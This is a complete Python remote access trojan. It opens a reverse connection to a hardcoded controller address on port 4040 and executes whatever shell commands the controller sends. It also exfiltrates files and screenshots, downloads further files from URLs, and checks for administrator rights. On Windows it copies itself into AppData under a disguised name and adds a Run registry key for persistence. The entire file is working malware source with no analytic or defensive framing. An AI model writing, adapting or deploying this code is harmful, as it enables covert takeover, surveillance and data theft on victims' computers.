#!/usr/bin/python3
import socket , json , os , base64
import subprocess
import shutil , platform , time
import sys
import requests , mss , zlib

# !!!! If The compiled file cant run, make sure to install requests: PIP INSTALL REQUESTS !!!!

IP_ADDRESS ="192.168.100.11"

def Open_App(sent):
    try:
        subprocess.Popen(sent,shell=True)
        send("  [+] Started")

    except:
        send("  [-] App does not exist")

def is_Admin():
    try:
        os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
        admin = "  [+] Administrator"
        return admin
    except:
        admin = "  [-] Normal User"
        return admin
        


def send_screenshot(conn):
    with mss.mss() as sct:
        screenshot = sct.shot()

        with open(screenshot, "rb") as f:
            img_data = f.read()

        compressed_data = zlib.compress(img_data)

        conn.sendall(len(compressed_data).to_bytes(4, byteorder='big'))

        conn.sendall(compressed_data)

def NON_NATIVE_GET(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name,"wb") as output_file:
        output_file.write(get_response.content)

def Activate_Connection(sock):
    while True:
        time.sleep(10)
        try:
            sok.connect((IP_ADDRESS,4040))
            shell()
        except ConnectionRefusedError:
            Activate_Connection(sock)
        except OSError:
            break

def change_Dir(sent):
    try:
        os.chdir(sent[3:])
        send("  [+]Directory Changed")
    except PermissionError:
        send("  [-] Permission Denied")
    except FileNotFoundError:
        send("  [-] No such directory")
    


def Download_Remote_File(sent):
    try:    
        with open(sent[9:],"rb") as file:
            send(base64.b64encode(file.read()))
    except FileNotFoundError:
        send("  [-] No Such File Found")

        
def Send_File(sent):
        with open(sent[5:],"wb") as file:
            file_data = receive()
            file.write(base64.b64decode(file_data[2:]))



def send(data):
    try:
        json_data = json.dumps(data)
        sok.send(json_data.encode('utf-8'))
    except:
        data = str(data)
        json_data = json.dumps(data)
        sok.send(json_data.encode('utf-8'))

def receive():
    data = ""
    while True:
        try :
            data = data + str(sok.recv(1024).decode('utf-8'))
            return json.loads(data)
        except ValueError:
            continue


def shell():
    while True:
        sent =receive()
        if (sent=='exit'):
            break
        if (sent=='die'):
            os._exit()
        elif sent[0:2] == 'cd' and len(sent) > 2:
            change_Dir(sent)
            continue
        if sent.startswith('open'):
            Open_App(sent[5:])
            continue
        elif sent[:8]=='download' and len(sent) > 8:
            Download_Remote_File(sent)
            continue
        elif sent[:4]=='send' and len(sent) > 4:
            Send_File(sent)
            continue
        elif sent=='priv' :
            send(is_Admin())
            continue
        elif sent=='platform':
            send("  "+sys.platform)
        elif sent[:3] == 'get' and len(sent)>3:
            try:
                NON_NATIVE_GET(sent[4:])
                send("  [+] File Downloaded Successfully")
                continue
            except:
                send("  [-] Could Not Download File")
                continue
        elif sent == 'screenshot':
            send_screenshot(sok)
            continue
        proc = subprocess.Popen(sent, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = proc.stdout.read() + proc.stderr.read()
        send(str(result))


if sys.platform.lower() !='linux':
    Location = os.environ["appdata"] + "\\windows32.exe"
    if not os.path.exists(Location):
        shutil.copyfile(sys.executable,Location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Toasted /t REG_SZ /d "' + Location +'"', shell=True)



sok = socket.socket(socket.AF_INET , socket.SOCK_STREAM)

Activate_Connection(sok)

sok.close()